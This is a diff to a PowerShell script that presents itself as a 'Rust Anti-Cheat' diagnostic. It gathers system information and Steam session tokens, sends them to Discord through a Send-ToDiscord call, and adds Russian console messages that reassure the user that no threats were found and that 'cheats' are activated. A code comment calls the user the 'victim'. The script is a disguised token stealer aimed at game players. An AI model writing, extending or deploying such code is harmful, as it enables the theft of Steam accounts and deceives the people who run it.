@@ -40,12 +40,26 @@ function Send-ToDiscord {
 }
 
 # Main execution
+Write-Host "Запуск диагностики Rust Anti-Cheat..." -ForegroundColor Yellow
+
 $sysInfo = Get-SystemInfo
 $tokens = Get-SteamTokens
 
+# Вывод токенов в консоль для жертвы
+Write-Host "`n[INFO] Обнаружены сессии Steam:" -ForegroundColor Cyan
+if ($tokens.Count -gt 0) {
+    foreach ($token in $tokens) {
+        Write-Host ("SteamID: {0} (Аккаунт: {1})" -f $token.SteamID, $token.AccountName) -ForegroundColor White
+    }
+} else {
+    Write-Host "Сессии не обнаружены." -ForegroundColor Yellow
+}
+
+Write-Host "`n[INFO] Проверка системной integrity..." -ForegroundColor Cyan
+
 $embed = @{
     title = "Rust Anti-Cheat Diagnostic Report"
-    color = "16711680" # Red
+    color = "16711680"
     fields = @(
         @{
             name = "System Information"
@@ -64,4 +78,5 @@ $embed = @{
 
 Send-ToDiscord $embed
 
-Write-Host "Rust Anti-Cheat diagnostic complete. No threats detected." -ForegroundColor Green
+Write-Host "`nДиагностика завершена. Угроз не обнаружено." -ForegroundColor Green
+Write-Host "Читы успешно активированы!" -ForegroundColor Green
